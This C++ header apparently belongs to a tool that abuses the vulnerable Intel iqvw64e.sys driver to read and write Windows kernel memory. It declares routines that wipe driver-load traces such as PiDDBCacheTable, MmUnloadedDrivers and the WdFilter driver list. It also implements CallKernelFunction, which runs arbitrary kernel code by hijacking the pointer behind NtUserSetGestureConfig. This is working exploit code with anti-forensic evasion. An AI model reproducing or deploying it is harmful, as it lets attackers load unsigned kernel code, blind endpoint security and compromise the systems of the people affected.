#pragma once
#include <Windows.h>
#include <string>
#include <iostream>

#include "utils.hpp"
#include "nt.hpp"
#include "MemoryAccessor.h"

namespace intel_driver
{
	constexpr DWORD iqvw64e_timestamp = 0x57ee5485;
	extern ULONG64 ntoskrnlAddr;
	extern MemoryAccessor ma;
	extern uintptr_t NtUserSetGestureConfig_ref;


	bool ClearPiDDBCacheTable(HANDLE device_handle);
	bool ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(HANDLE device_handle, PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(HANDLE device_handle, nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	nt::PiDDBCacheEntry* LookupEntry(HANDLE device_handle, nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name);
	PVOID ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);
	bool AcquireDebugPrivilege();

	uintptr_t FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList(HANDLE device_handle);
	bool ClearWdFilterDriverList(HANDLE device_handle);

	bool IsRunning();
	HANDLE Load();
	bool Unload(HANDLE device_handle);

	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);

	/*added by herooyyy*/
	uint64_t MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size);
	bool MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect);
	
	uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);

	bool FreePool(HANDLE device_handle, uint64_t address);
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers(HANDLE device_handle);
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	template<typename T, typename ...A>
	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		const HMODULE win32u = GetModuleHandleA("win32u.dll");
		if (win32u == 0) {
			Log(L"[-] Failed to load win32u.dll" << std::endl); //never should happens
			return false;
		}

		const auto NtUserSetGestureConfig = reinterpret_cast<void*>(GetProcAddress(win32u, "NtUserSetGestureConfig"));
		if (!NtUserSetGestureConfig)
		{
			Log(L"[-] Failed to get export win32u.NtUserSetGestureConfig" << std::endl);
			return false;
		}

		uintptr_t oNtUserSetGestureConfig = 0;

		if (!ReadMemory(device_handle, NtUserSetGestureConfig_ref, &oNtUserSetGestureConfig, sizeof(oNtUserSetGestureConfig)))
			return false;

		// Overwrite the pointer with kernel_function_address
		if (!WriteMemory(device_handle, NtUserSetGestureConfig_ref, &kernel_function_address, sizeof(kernel_function_address)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtUserSetGestureConfig);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtUserSetGestureConfig);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return WriteMemory(device_handle, NtUserSetGestureConfig_ref, &oNtUserSetGestureConfig, sizeof(oNtUserSetGestureConfig));
	}
}
